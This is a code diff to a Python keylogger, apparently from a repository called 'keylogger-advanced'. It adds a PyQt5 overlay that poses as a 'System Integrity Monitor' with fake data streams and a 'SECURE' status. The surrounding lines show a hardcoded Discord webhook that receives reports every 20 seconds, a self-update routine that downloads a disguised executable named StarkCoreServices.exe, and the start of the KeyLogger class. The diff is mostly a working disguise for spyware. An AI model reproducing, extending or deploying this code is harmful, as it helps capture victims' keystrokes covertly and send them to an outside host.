@@ -31,14 +31,17 @@ try:
     import psutil
     from threading import Thread, Timer
     from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
-    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint
-    from PyQt5.QtGui import QFont, QColor, QPalette
+    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint, QRectF, QRect
+    from PyQt5.QtGui import QFont, QColor, QPalette, QPainter, QPen, QBrush, QLinearGradient, QConicalGradient
+    import random
 except Exception as e:
     OVERLAY_AVAILABLE = False
     OVERLAY_ERROR = str(e)
     class QMainWindow: pass
     class QWidget: pass
     class QApplication: pass
+    class QPainter: pass 
+    class QRectF: pass
     Qt = None
 IMPORT_ERROR = None
 
@@ -71,7 +74,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.7"
+    VERSION = "3.0"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
@@ -79,109 +82,299 @@ finally:
     class SystemOverlay(QMainWindow):
         def __init__(self):
             super().__init__()
+            # Window Flags & Attributes
             self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
             self.setAttribute(Qt.WA_TranslucentBackground)
-            self.setWindowOpacity(0.0) # Start transparent for fade-in
-            
-            # Position: Top Right (Larger, more padding)
-            screen_geo = QApplication.desktop().screenGeometry()
-            self.setGeometry(screen_geo.width() - 550, 60, 500, 300)
-            
-            # UI Setup
-            self.central_widget = QWidget()
-            self.setCentralWidget(self.central_widget)
-            self.layout = QVBoxLayout(self.central_widget)
-            
-            # Styling (Sci-Fi / Glow Look)
-            self.central_widget.setStyleSheet("""
-                QWidget {
-                    background-color: rgba(10, 20, 30, 230);
-                    border: 3px solid #00FFFF;
-                    border-radius: 15px;
-                }
-                QLabel {
-                    color: #00FFFF;
-                    background: transparent;
-                    border: none;
-                }
-            """)
-            
-            # Title
-            self.title_label = QLabel("SYSTEM CORE INITIALIZATION")
-            self.title_label.setFont(QFont("Segoe UI", 16, QFont.Bold))
-            self.title_label.setAlignment(Qt.AlignCenter)
-            self.title_label.setStyleSheet("color: #FFFFFF; font-weight: bold; margin-bottom: 10px;")
-            self.layout.addWidget(self.title_label)
-            
-            # Separator Line
-            line = QLabel("")
-            line.setFixedHeight(3)
-            line.setStyleSheet("background-color: #00FFFF;")
-            self.layout.addWidget(line)
-            
-            # Stats Labels
-            font_stats = QFont("Consolas", 14)
-            
-            self.cpu_label = QLabel("CPU:  [ANALYZING]")
-            self.cpu_label.setFont(font_stats)
-            self.layout.addWidget(self.cpu_label)
-            
-            self.ram_label = QLabel("MEM:  [ANALYZING]")
-            self.ram_label.setFont(font_stats)
-            self.layout.addWidget(self.ram_label)
-            
-            self.batt_label = QLabel("BATT: [ANALYZING]")
-            self.batt_label.setFont(font_stats)
-            self.layout.addWidget(self.batt_label)
+            self.setWindowOpacity(0.0)
 
-            self.status_label = QLabel("STATUS: BOOT SEQUENCE INITIATED...")
-            self.status_label.setFont(QFont("Consolas", 10))
-            self.status_label.setStyleSheet("color: #00FF00; margin-top: 15px;")
-            self.status_label.setAlignment(Qt.AlignCenter)
-            self.layout.addWidget(self.status_label)
+            # --- DYNAMIC GEOMETRY (20-25% Width) ---
+            screen_rect = QApplication.desktop().screenGeometry()
+            s_w, s_h = screen_rect.width(), screen_rect.height()
+            
+            # Target width: 22% of screen
+            self.w_width = int(s_w * 0.22)
+            # Minimum width clamp
+            if self.w_width < 350: self.w_width = 350
+            
+            self.w_height = 450 # Taller for data streams
+            
+            # Align Top Right with margin
+            self.setGeometry(s_w - self.w_width - 40, 50, self.w_width, self.w_height)
 
-            # Timers
-            self.update_timer = QTimer(self)
-            self.update_timer.timeout.connect(self.update_stats)
-            self.update_timer.start(100) # Fast updates (100ms)
+            # State Variables
+            self.rotation_angle = 0
+            self.hex_lines = []
+            self.show_hex = False
+            self.show_reactor = False
+            self.show_modules = False
+            self.is_first_run = self.check_first_run()
             
-            # Animations
-            self.anim = QPropertyAnimation(self, b"windowOpacity")
-            self.anim.setDuration(1000) # 1s fade in (Slower for dramatic effect)
-            self.anim.setStartValue(0.0)
-            self.anim.setEndValue(1.0)
-            self.anim.start()
+            # Data
+            self.cpu_val = 0
+            self.ram_val = 0
+            self.network_status = "CONNECTING"
+            self.start_time = datetime.now()
             
-            # Life Cycle (Extended by 5 seconds)
-            QTimer.singleShot(6000, self.systems_nominal)     # After 6s
-            QTimer.singleShot(9000, self.fade_out)            # After 9s
+            # Generate random hex lines initially
+            self.update_hex_lines()
 
-        def update_stats(self):
-            cpu = psutil.cpu_percent()
-            ram = psutil.virtual_memory().percent
+            # --- ANIMATION TIMERS ---
             
-            # Battery
-            battery = psutil.sensors_battery()
-            if battery:
-                batt_text = f"{battery.percent}% {'(CHRG)' if battery.power_plugged else ''}"
-            else:
-                batt_text = "AC POWER"
+            # 1. Rendering Timer (60 FPS approx) - For Rotation
+            self.anim_timer = QTimer(self)
+            self.anim_timer.timeout.connect(self.update_animation_step)
+            self.anim_timer.start(30)
             
-            self.cpu_label.setText(f"CPU:  {cpu}%")
-            self.ram_label.setText(f"MEM:  {ram}%")
-            self.batt_label.setText(f"PWR:  {batt_text}")
+            # 2. Data Timer (Slower)
+            self.data_timer = QTimer(self)
+            self.data_timer.timeout.connect(self.update_data)
+            self.data_timer.start(800)
+            
+            # 3. Hex Stream Update Timer
+            self.hex_timer = QTimer(self)
+            self.hex_timer.timeout.connect(self.update_hex_lines)
+            self.hex_timer.start(150)
 
-        def systems_nominal(self):
-            self.status_label.setText("ALL SYSTEMS NOMINAL")
-            self.title_label.setText("SECURITY SERVICE ACTIVE")
+            # --- CINEMATIC SEQUENCE TIMELINE (10s) ---
+            
+            # 0.0s: Fade In
+            self.anim_in = QPropertyAnimation(self, b"windowOpacity")
+            self.anim_in.setDuration(800)
+            self.anim_in.setStartValue(0.0)
+            self.anim_in.setEndValue(1.0)
+            self.anim_in.start()
+            
+            # 1.0s: Reactor Spin Up
+            QTimer.singleShot(1000, lambda: setattr(self, 'show_reactor', True))
+            
+            # 2.0s: Hex Streams Start
+            QTimer.singleShot(2000, lambda: setattr(self, 'show_hex', True))
+            
+            # 3.0s: Modules Pop
+            QTimer.singleShot(3000, lambda: setattr(self, 'show_modules', True))
+            
+            # 10.0s: Fade Out (End)
+            QTimer.singleShot(10000, self.fade_out) 
+
+            self.update_data()
+            
+        def check_first_run(self):
+            marker_path = os.path.join(os.getenv('TEMP'), 'stark_core_v2.run')
+            if not os.path.exists(marker_path):
+                try:
+                    with open(marker_path, 'w') as f: f.write("1")
+                except: pass
+                return True
+            return False
+
+        def update_animation_step(self):
+            self.rotation_angle += 5
+            if self.rotation_angle >= 360: self.rotation_angle = 0
+            self.update()
+
+        def update_hex_lines(self):
+            # Generate random "code" lines
+            chars = "ABCDEF0123456789"
+            lines = []
+            for _ in range(8):
+                line = "".join(random.choice(chars) for _ in range(16))
+                lines.append(f"0x{line} :: MEM_ALLOC")
+            self.hex_lines = lines
+            if self.show_hex: self.update()
+
+        def update_data(self):
+            self.cpu_val = psutil.cpu_percent()
+            self.ram_val = psutil.virtual_memory().percent
+            self.network_status = "SECURE" if psutil.net_if_stats() else "SCANNING"
 
         def fade_out(self):
             self.anim_out = QPropertyAnimation(self, b"windowOpacity")
-            self.anim_out.setDuration(500) # 0.5s fade out
+            self.anim_out.setDuration(800)
             self.anim_out.setStartValue(1.0)
             self.anim_out.setEndValue(0.0)
             self.anim_out.finished.connect(self.close)
             self.anim_out.start()
+
+        def paintEvent(self, event):
+            painter = QPainter(self)
+            painter.setRenderHint(QPainter.Antialiasing)
+            rect = self.rect()
+            
+            # Colors
+            cyan = QColor(0, 255, 255)
+            # cyan_dim = QColor(0, 255, 255, 40)
+            blue_bg = QColor(5, 10, 20, 245) # Darker
+            
+            # 1. Main Background
+            painter.setBrush(QBrush(blue_bg))
+            painter.setPen(Qt.NoPen)
+            painter.drawRect(rect)
+            
+            # 2. Tech Frame (Outer Bracket)
+            self.draw_tech_frame(painter, 5, 5, self.w_width-10, self.w_height-10, cyan)
+            
+            # 3. Header Bar
+            painter.setBrush(QBrush(QColor(0, 255, 255, 30)))
+            painter.setPen(Qt.NoPen)
+            # Top header block
+            painter.drawRect(20, 15, self.w_width-40, 30)
+            
+            # Title
+            k_font = QFont("Segoe UI", 11, QFont.Bold)
+            k_font.setLetterSpacing(QFont.AbsoluteSpacing, 1)
+            painter.setFont(k_font)
+            painter.setPen(cyan)
+            painter.drawText(QRect(0, 15, self.w_width, 30), Qt.AlignCenter, "SYSTEM INTEGRITY MONITOR // V3.0")
+
+            # --- MODULES ---
+            
+            # 4. Data Box (Left)
+            if self.show_hex:
+                 self.draw_module_box(painter, 20, 60, 200, 140, "DATA STREAM")
+                 
+                 hex_font = QFont("Consolas", 7)
+                 painter.setFont(hex_font)
+                 painter.setPen(QColor(0, 200, 200, 200))
+                 
+                 y_start = 95
+                 for line in self.hex_lines[:6]:
+                     painter.drawText(30, y_start, line)
+                     y_start += 12
+
+            # 5. System Stats Box (Bottom Left)
+            if self.show_modules:
+                self.draw_module_box(painter, 20, 210, 200, 100, "SYSTEM STATS")
+                
+                painter.setFont(QFont("Consolas", 8))
+                painter.setPen(QColor(255, 255, 255, 220))
+                
+                uptime = datetime.now() - self.start_time
+                uptime_str = str(uptime).split('.')[0]
+                
+                y = 235
+                painter.drawText(30, y, f"OS: WINDOWS NT")
+                painter.drawText(30, y+15, f"REL: {platform.release()}")
+                painter.drawText(30, y+30, f"UP: {uptime_str}")
+                painter.drawText(30, y+45, f"USR: {os.getenv('USERNAME').upper()}")
+                
+            # 6. Reactor/Reticle (Top Right)
+            if self.show_reactor:
+                r_x, r_y = 280, 130 # Center point
+                
+                # Draw Box Frame for Reticle
+                self.draw_module_box(painter, 230, 60, 150, 140, "TARGETING")
+                
+                painter.save()
+                painter.translate(r_x + 25, r_y) # Center inside the box (roughly)
+                
+                # Crosshair Lines (Fixed)
+                painter.setPen(QPen(QColor(0, 255, 255, 100), 1))
+                painter.drawLine(-60, 0, 60, 0)
+                painter.drawLine(0, -60, 0, 60)
+                
+                # Rotating Outer Ring
+                painter.rotate(self.rotation_angle)
+                painter.setPen(QPen(cyan, 2))
+                painter.setBrush(Qt.NoBrush)
+                painter.drawEllipse(-35, -35, 70, 70)
+                # Ticks
+                for _ in range(4):
+                    painter.drawLine(35, 0, 45, 0)
+                    painter.rotate(90)
+                
+                # Rotating Inner Ring (Counter)
+                painter.rotate(-self.rotation_angle * 2)
+                painter.setPen(QPen(cyan, 1))
+                painter.drawEllipse(-20, -20, 40, 40)
+                painter.drawRect(-10, -10, 20, 20)
+                
+                painter.restore()
+
+            # 7. Progress Bars (Bottom Right)
+            if self.show_modules:
+                 self.draw_module_box(painter, 230, 210, 150, 100, "RESOURCES")
+                 
+                 # CPU
+                 painter.setFont(QFont("Consolas", 8))
+                 painter.setPen(cyan)
+                 painter.drawText(240, 235, f"CPU: {int(self.cpu_val)}%")
+                 self.draw_segmented_bar(painter, 240, 240, 130, 6, self.cpu_val, cyan)
+                 
+                 # RAM
+                 painter.drawText(240, 265, f"RAM: {int(self.ram_val)}%")
+                 self.draw_segmented_bar(painter, 240, 270, 130, 6, self.ram_val, cyan)
+                 
+                 # STATUS
+                 painter.setFont(QFont("Impact", 14))
+                 painter.setPen(QColor(0, 255, 0) if self.network_status == "SECURE" else QColor(255, 100, 0))
+                 painter.drawText(240, 300, self.network_status)
+
+        # --- Helper Drawing Functions ---
+        def draw_tech_frame(self, p, x, y, w, h, color):
+            p.setPen(QPen(color, 2))
+            p.setBrush(Qt.NoBrush)
+            
+            # Tech Bracket Shape (Chamfered corners)
+            corner = 15
+            
+            from PyQt5.QtGui import QPolygon
+            points = [
+                QPoint(x + corner, y),
+                QPoint(x + w - corner, y),
+                QPoint(x + w, y + corner),
+                QPoint(x + w, y + h - corner),
+                QPoint(x + w - corner, y + h),
+                QPoint(x + corner, y + h),
+                QPoint(x, y + h - corner),
+                QPoint(x, y + corner)
+            ]
+            p.drawPolygon(QPolygon(points))
+            
+            # Corner Accents (Thicker)
+            p.setPen(QPen(color, 3))
+            len_ = 20
+            # Top Left
+            p.drawLine(x, y + corner, x, y + corner + len_)
+            p.drawLine(x + corner, y, x + corner + len_, y)
+            # Bottom Right
+            p.drawLine(x + w, y + h - corner, x + w, y + h - corner - len_)
+            p.drawLine(x + w - corner, y + h, x + w - corner - len_, y + h)
+
+        def draw_module_box(self, p, x, y, w, h, title):
+            # Thin background
+            p.setBrush(QBrush(QColor(0, 50, 50, 100)))
+            p.setPen(Qt.NoPen)
+            # p.drawRect(x, y, w, h)
+            
+            # Tech Frame
+            self.draw_tech_frame(p, x, y, w, h, QColor(0, 255, 255, 100))
+            
+            # Small Header
+            p.setBrush(QBrush(QColor(0, 255, 255, 50)))
+            p.drawRect(x+5, y+5, 100, 15)
+            
+            p.setFont(QFont("Segoe UI", 7, QFont.Bold))
+            p.setPen(QColor(0, 255, 255))
+            p.drawText(x+10, y+16, title)
+
+        def draw_segmented_bar(self, p, x, y, w, h, val, color):
+            total_segs = 15
+            seg_w = (w - (total_segs-1)*2) / total_segs
+            
+            filled_segs = int((val / 100.0) * total_segs)
+            
+            for i in range(total_segs):
+                sx = x + i * (seg_w + 2)
+                
+                if i < filled_segs:
+                    p.setBrush(QBrush(color))
+                    p.setPen(Qt.NoPen)
+                else:
+                    p.setBrush(QBrush(QColor(0, 50, 50))) # Dark
+                    p.setPen(Qt.NoPen)
+                    
+                p.drawRect(int(sx), int(y), int(seg_w), int(h))
+
 
     class KeyLogger:
         def __init__(self, time_interval, webhook_url):
